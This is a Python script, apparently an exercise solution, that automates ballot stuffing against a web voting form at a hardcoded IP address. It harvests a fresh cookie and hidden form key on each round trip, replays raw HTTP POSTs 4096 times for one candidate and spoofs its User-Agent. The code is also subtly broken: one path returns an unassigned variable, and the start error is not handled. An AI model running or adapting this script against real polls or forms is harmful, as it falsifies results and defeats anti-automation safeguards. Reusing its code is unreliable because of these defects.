#!/usr/bin/python3
"""Vote for myself 4096 despite a hidden form key"""


import lxml.html
import socket
import time


response = bytearray()
"""The buffer used to store pieces of the response that haven't been parsed"""

requestStart = '''GET /level1.php HTTP/1.1\r
Connection: keep-alive\r
Host: 158.69.76.135\r
Origin: http://158.69.76.135\r
User-Agent: U.S. Department of Education Doomsday Satellite\r
\r
'''
"""The request used to get the first form key and cookie"""

requestVote = '''POST /level1.php HTTP/1.1\r
Connection: {connection}\r
Content-Length: {length}\r
Content-Type: application/x-www-form-urlencoded\r
Cookie: HoldTheDoor={cookie}\r
Host: 158.69.76.135\r
Origin: http://158.69.76.135\r
Referer: http://158.69.76.135/level1.php\r
User-Agent: U.S. Department of Education Doomsday Satellite\r
\r
id=701&holdthedoor=Submit&key={key}'''
"""The request used to make a vote"""


def getCookie(headers: list) -> str:
    cookie = headers.get('SET-COOKIE', '')
    cookie = cookie.partition('=')[2].partition(';')[0]
    return cookie


def getFormKey(doc: lxml.html.HtmlElement) -> str:
    el = doc.cssselect('form>input[name="key"]')[0]
    return el.get('value')


def openSocket() -> socket.socket:
    """Make a new socket connected to the target server"""

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('158.69.76.135', 80))
    return sock


def receiveResponse(sock: socket.socket) -> tuple:
    """Receive the next response from the connected socket"""

    global response
    buffer = None
    while b'\r\n\r\n' not in response and buffer != b'':
        buffer = sock.recv(8192)
        response.extend(buffer)
    if b'\r\n\r\n' not in response:
        return None, None
    headers, _, response = response.partition(b'\r\n\r\n')
    status, _, headers = headers.partition(b'\r\n')
    headers = (l.partition(b': ') for l in headers.split(b'\r\n'))
    headers = {n.upper().decode('ASCII'): v.decode() for n, _, v in headers}
    headers['status'] = status.partition(b' ')[2].decode()
    length = int(headers.get('CONTENT-LENGTH', 0))
    while len(response) < length and buffer != b'':
        buffer = sock.recv(8192)
        response.extend(buffer)
    if len(response) < length:
        return headers, body
    body = bytes(response[:length])
    response = response[length:]
    return headers, body


def winElection():
    """Vote for myself 4096 times"""

    sock = openSocket()
    sock.sendall(requestStart.encode('ASCII'))
    headers, body = receiveResponse(sock)
    if body is None:
        print('error at start')
    doc = lxml.html.fromstring(body.decode('ASCII'))
    cookie = getCookie(headers)
    key = getFormKey(doc)
    for i in range(4096):
        if headers.get('CONNECTION', 'close').lower() == 'close':
            sock.close()
            sock = openSocket()
        request = requestVote.format(
            connection = 'keep-alive' if i < 4095 else 'close',
            length = 30 + len(key),
            cookie = cookie,
            key = key
        ).encode('ASCII')
        sock.sendall(request)
        headers, body = receiveResponse(sock)
        doc = lxml.html.fromstring(body.decode('ASCII'))
        cookie = getCookie(headers)
        key = getFormKey(doc)
        print('voted {:d} time(s)'.format(i))
